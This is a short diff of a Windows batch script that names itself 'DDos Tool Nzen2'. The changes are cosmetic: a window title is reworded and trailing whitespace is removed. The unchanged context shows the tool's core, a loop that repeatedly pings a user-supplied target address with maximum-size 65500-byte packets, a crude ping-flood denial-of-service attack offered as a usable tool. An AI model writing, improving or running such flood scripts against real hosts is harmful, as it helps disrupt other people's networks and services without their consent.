@@ -103,7 +103,7 @@ echo Started: >> log.txt
 ping localhost >> log.txt
 title DDos Tool Nzen2- Press anything to continue
 pause
-title Waiting input
+title Waiting for input
 goto PreAttack
 
 :PreAttack
@@ -130,5 +130,5 @@ pause goto DDos
 
 :DDos
 :loop
-ping %AttackIP% -l 65500 -w 1 -n 1 
+ping %AttackIP% -l 65500 -w 1 -n 1
 goto :loop
